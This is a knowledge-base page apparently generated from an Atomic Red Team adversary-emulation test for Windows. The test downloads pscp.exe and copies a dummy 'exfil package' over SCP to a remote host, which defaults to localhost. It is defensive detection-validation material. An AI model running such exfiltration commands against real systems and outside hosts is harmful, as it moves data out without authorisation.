---
atomic_guid: "c82b1e60-c549-406f-9b00-0a8ae31c9cfe"
title: "Remote File Copy using PSCP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "c82b1e60-c549-406f-9b00-0a8ae31c9cfe"
  - "Remote File Copy using PSCP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Remote File Copy using PSCP

Copy a staged file using PSCP.exe to a public target location.

## Metadata

- Atomic GUID: c82b1e60-c549-406f-9b00-0a8ae31c9cfe
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### exfil_package

- description: path to exfil package
- type: path
- default: C:\Temp\T1105_scp.zip

### pscp_binary

- description: PSCP binary location
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe

### pscp_url

- description: pscp.exe download path
- type: string
- default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe

### scp_password

- description: Password for the SCP User
- type: string
- default: atomic

### scp_port

- description: port for the remote server
- type: string
- default: 22

### scp_user

- description: Username of the SCP user
- type: string
- default: atomic

### target_filename

- description: Filename on the destination.
- type: string
- default: T1105_scp.zip

### target_location

- description: Remote location where the data will be copied to.
- type: string
- default: 127.0.0.1

## Dependencies

pscp.exe must be available on the system.

### Prerequisite Check

```powershell
if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "#{pscp_url}" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\pscp.exe"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
fsutil file createnew C:\Temp\T1105_scp.zip 1048576
echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
```

### Cleanup

```cmd
del /f /q #{exfil_package}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
